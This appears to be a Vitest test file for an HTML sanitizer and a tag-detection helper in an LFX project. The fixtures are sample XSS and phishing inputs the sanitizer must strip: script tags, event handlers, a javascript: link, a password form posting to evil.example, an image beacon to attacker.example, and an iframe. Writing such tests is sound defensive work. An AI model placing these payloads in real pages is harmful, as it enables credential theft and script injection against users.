// Copyright The Linux Foundation and each contributor to LFX.
// SPDX-License-Identifier: MIT

import { describe, expect, it } from 'vitest';
import { hasHtmlTags, useSanitize } from './useSanitize';

const { sanitize, renderDescription } = useSanitize();

describe('useSanitize', () => {
  it('strips script and event handlers', () => {
    expect(sanitize('<p onclick="x()">hi</p><script>alert(1)</script>')).toBe('<p>hi</p>');
  });

  it('keeps the formatting the editors produce', () => {
    const html =
      '<h2>Goals</h2><p><strong>Bold</strong> <em>it</em> <u>u</u> <s>s</s> <code>x</code></p>' +
      '<ul><li>one</li></ul><ol><li>two</li></ol><blockquote>q</blockquote><pre>code</pre>' +
      '<p><a href="https://example.org">link</a><br>next</p>';
    expect(renderDescription(html)).toBe(html);
  });

  it.each([
    [
      'a form overlay',
      '<form class="o" action="https://evil.example/c"><h1>Sign in</h1><input name="u"><input name="p" type="password"><label>L</label><select><option>o</option></select><textarea>t</textarea><button>Go</button></form>',
      '<h1>Sign in</h1>LotGo',
    ],
    ['a document-wide <style>', '<style>.o{position:fixed;inset:0}</style><p>a</p>', '<p>a</p>'],
    ['an image beacon', '<p>a</p><img src="https://attacker.example/b.gif">', '<p>a</p>'],
    [
      'styling and identity attributes',
      '<p style="color:red" class="ql-align-center" id="x" name="n">a</p>',
      '<p>a</p>',
    ],
    [
      'SVG and MathML',
      '<svg><title>t</title><rect></rect></svg><math><mi>x</mi></math><p>a</p>',
      '<p>a</p>',
    ],
    ['a javascript: link', '<a href="javascript:alert(1)">a</a>', '<a>a</a>'],
    [
      'a link target and rel (reverse tabnabbing)',
      '<a href="https://example.org" target="_blank" rel="opener">a</a>',
      '<a href="https://example.org">a</a>',
    ],
    ['data attributes', '<p data-x="1">a</p>', '<p>a</p>'],
    ['an iframe', '<iframe src="https://evil.example"></iframe><p>a</p>', '<p>a</p>'],
  ])('removes %s from HTML descriptions', (_name, raw, expected) => {
    expect(renderDescription(raw)).toBe(expected);
  });

  it('turns plain text into paragraphs and line breaks', () => {
    expect(renderDescription('one\r\ntwo\r\n\r\n\nthree\rfour')).toBe(
      '<p>one<br>two</p><p>three<br>four</p>',
    );
  });

  it('escapes HTML-sensitive characters in plain text', () => {
    expect(renderDescription('a < b && c > d')).toBe('<p>a &lt; b &amp;&amp; c &gt; d</p>');
  });

  it('returns whitespace-only text as-is', () => {
    expect(renderDescription('\n\n')).toBe('\n\n');
    expect(renderDescription('')).toBe('');
  });

  it('treats a `<` with no closing `>` as plain text', () => {
    expect(renderDescription('x <a b')).toBe('<p>x &lt;a b</p>');
  });
});

describe('hasHtmlTags', () => {
  it('detects exactly what the former tag-detection regex detected', () => {
    const former = /<[a-z][\s\S]*>/i;
    const alphabet = ['<', '>', 'a', 'B', '1', ' ', '\n', '<p>', '</p>'];
    let seed = 7;
    const next = () => (seed = (seed * 1103515245 + 12345) % 2 ** 31);
    for (let i = 0; i < 1000; i++) {
      const raw = Array.from(
        { length: next() % 30 },
        () => alphabet[next() % alphabet.length],
      ).join('');
      expect(hasHtmlTags(raw)).toBe(former.test(raw));
    }
  });

  it.each([
    ['repeated <a', '<a'.repeat(500_000), false],
    ['repeated <a then >', `${'<a'.repeat(500_000)}>`, true],
    ['repeated <', '<'.repeat(1_000_000), false],
  ])('runs in linear time on 1 MB of %s', (_name, raw, expected) => {
    const start = performance.now();
    expect(hasHtmlTags(raw)).toBe(expected);
    expect(performance.now() - start).toBeLessThan(1000);
  });
});
